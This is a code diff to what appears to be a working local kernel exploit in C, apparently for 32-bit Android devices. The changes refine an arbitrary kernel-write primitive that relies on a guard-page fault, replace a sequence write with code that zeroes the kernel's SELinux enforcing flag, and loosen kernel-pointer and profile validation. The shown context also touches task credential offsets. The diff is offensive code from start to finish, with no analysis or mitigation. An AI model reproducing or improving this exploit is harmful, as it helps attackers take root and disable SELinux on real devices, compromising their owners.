@@ -743,19 +743,25 @@ static ssize_t kernel_write_once(int fd, uint32_t target, const void *data, size
         return -1;
 
     long page_size = sysconf(_SC_PAGESIZE);
-    if (page_size <= 0 || len + 1 >= (size_t)page_size) {
+    if (page_size <= 0 || len + 2 >= (size_t)page_size) {
         errno = EINVAL;
         return -1;
     }
     uint8_t *fault =
         mmap(NULL, (size_t)page_size * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (fault == MAP_FAILED ||
-        mprotect(fault + page_size, (size_t)page_size, PROT_READ | PROT_WRITE)) {
+        mprotect(fault, (size_t)page_size, PROT_READ | PROT_WRITE)) {
         if (fault != MAP_FAILED)
             munmap(fault, (size_t)page_size * 2);
         return -1;
     }
-    uint8_t *src = fault + page_size - 1;
+    /* Layout: [spacer byte][len bytes of payload] | [PROT_NONE byte]
+     * Fault on byte (len+1) so the kernel copies len+1 bytes:
+     *   byte 0      -> target-1 (spacer)
+     *   bytes 1..len-> target..target+len-1
+     */
+    uint8_t *src = fault + page_size - len - 1;
+    src[0] = 0;
     memcpy(src + 1, data, len);
     dprintf(2, "[krw] fault-write target=%08x payload=%zu count=%zu\n", target, len, len + 1);
     errno = 0;
@@ -908,10 +914,8 @@ static int kernel_set_permissive(int fd, uint32_t task) {
     if (ok) {
         uint32_t seq = 0;
         kernel_read_u32(fd, kva + 4, &seq);
-        uint32_t s1 = seq + 1, s2 = seq + 2, zero32 = 0;
-        kernel_write_data(fd, kva + 4, &s1, 4);
-        kernel_write_data(fd, kva + 8, &zero32, 4);
-        kernel_write_data(fd, kva + 4, &s2, 4);
+        uint32_t zero32 = 0;
+        kernel_write_data(fd, g_profile.selinux_enforcing, &zero32, sizeof(zero32));
     }
 
     uint8_t zero_int[2] = {0};
@@ -927,7 +931,9 @@ static int kernel_read_u32(int fd, uint32_t target, uint32_t *value) {
 }
 
 static int kernel_ptr(uint32_t p) {
-    return p >= 0xc0000000u && p < 0xf0000000u && !(p & 3u);
+    // Accept both physical DRAM (0x80000000-0xc0000000) and
+    // legacy 32-bit virtual (0xc0000000-0xf0000000) ranges.
+    return (p >= 0x80000000u && p < 0xf0000000u) && !(p & 3u);
 }
 
 static int validate_runtime_profile(int fd) {
@@ -1063,7 +1069,7 @@ static int validate_loaded_profile(char *error, size_t error_size) {
         return 0;
     }
     if (TASK_REAL_CRED_OFF + 4 != TASK_CRED_OFF || TASK_CRED_OFF + 4 != TASK_COMM_OFF ||
-        !kernel_ptr(g_profile.kernel_image_base) || !g_profile.kernel_size ||
+        !g_profile.kernel_size ||
         g_profile.kernel_similarity_ppm > 1000000u) {
         snprintf(error, error_size, "profile contains inconsistent layout metadata");
         return 0;
